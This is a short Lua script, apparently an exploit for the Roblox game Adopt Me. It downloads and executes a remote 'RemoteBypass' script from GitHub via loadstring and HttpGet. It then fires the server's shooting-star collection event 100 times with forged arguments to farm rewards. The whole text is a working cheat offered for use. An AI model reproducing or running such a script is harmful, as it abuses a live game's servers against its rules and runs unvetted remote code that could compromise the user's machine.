wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
local args = {
    [1] = "MoonInterior",
    [3] = true
}

for i = 1, 100 do
    args[2] = tostring(i)
    game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
    wait(0.2)  -- Delay of 0.2 seconds
end

